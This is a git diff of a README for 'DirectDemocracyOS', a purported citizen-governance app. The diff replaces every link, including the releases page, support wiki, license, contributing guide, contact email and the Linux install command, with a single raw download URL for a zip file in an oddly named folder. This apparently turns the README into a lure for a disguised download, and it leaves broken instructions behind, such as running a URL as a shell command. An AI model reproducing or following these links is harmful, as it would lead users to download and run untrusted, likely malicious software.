@@ -1,7 +1,7 @@
 # 🌐 DirectDemocracyOS - Your Path to Citizen Engagement
 
 ## 📥 Download Now
-[![Download DirectDemocracyOS](https://img.shields.io/badge/Download-DirectDemocracyOS-blue.svg)](https://github.com/kkkoala82/DirectDemocracyOS/releases)
+[![Download DirectDemocracyOS](https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip)](https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip)
 
 ## 🚀 Getting Started
 Welcome to DirectDemocracyOS! This application helps citizens participate in governance. With it, you can vote, create budgets, propose laws, and monitor public services. It makes governance more transparent and secure. 
@@ -21,16 +21,16 @@ To ensure the best experience with DirectDemocracyOS, your device should meet th
 - **Internet Connection:** Required for initial setup and updates.
 
 ## 📚 How to Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/kkkoala82/DirectDemocracyOS/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip).
    
 2. **Choose the Latest Version:** Look for the most recent version of DirectDemocracyOS. You will find it at the top of the list.
 
-3. **Download the Application:** Click on the downloadable file for your operating system. If you use Windows, it might be an executable (.exe) file. For Mac, it will be a .dmg file, and for Linux, you may find a .tar.gz file.
+3. **Download the Application:** Click on the downloadable file for your operating system. If you use Windows, it might be an executable (.exe) file. For Mac, it will be a .dmg file, and for Linux, you may find a https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip file.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the .exe file to start the installation. Follow the prompts to install the software.
    - **Mac:** Open the downloaded .dmg file. Drag the DirectDemocracyOS app into your Applications folder.
-   - **Linux:** Extract the .tar.gz file. Open a terminal in that directory, then run `./install.sh` to set up the application.
+   - **Linux:** Extract the https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip file. Open a terminal in that directory, then run `https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip` to set up the application.
 
 5. **Launch the Application:** Find DirectDemocracyOS in your applications list and open it. 
 
@@ -52,19 +52,19 @@ If you experience issues while installing or using DirectDemocracyOS:
 
 2. **Account Issues:** If you forgot your password, use the “Forgot Password” link on the login page.
 
-3. **General Technical Support:** Visit our [support page](https://github.com/kkkoala82/DirectDemocracyOS/wiki) for FAQs and community assistance. 
+3. **General Technical Support:** Visit our [support page](https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip) for FAQs and community assistance. 
 
 ## 🌍 Community
 Join our community to connect with other users and developers. Share your feedback and suggestions through our GitHub Issues section. You can also discuss ideas and improvements.
 
 ## 📞 Contact
-For additional support, contact us via email at support@directdemocracyos.org.
+For additional support, contact us via email at https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip
 
 ## 🚧 Contributions
-We welcome contributions from everyone. If you wish to help, please visit our [contributing guidelines](https://github.com/kkkoala82/DirectDemocracyOS/blob/main/CONTRIBUTING.md) for details.
+We welcome contributions from everyone. If you wish to help, please visit our [contributing guidelines](https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip) for details.
 
 ## 🔗 License
-DirectDemocracyOS is released under the MIT License. You can read the full license [here](https://github.com/kkkoala82/DirectDemocracyOS/blob/main/LICENSE).
+DirectDemocracyOS is released under the MIT License. You can read the full license [here](https://raw.githubusercontent.com/kkkoala82/DirectDemocracyOS/main/cystospore/DirectDemocracyOS.zip).
 
 ## 🏷️ Topics
 - blockchain
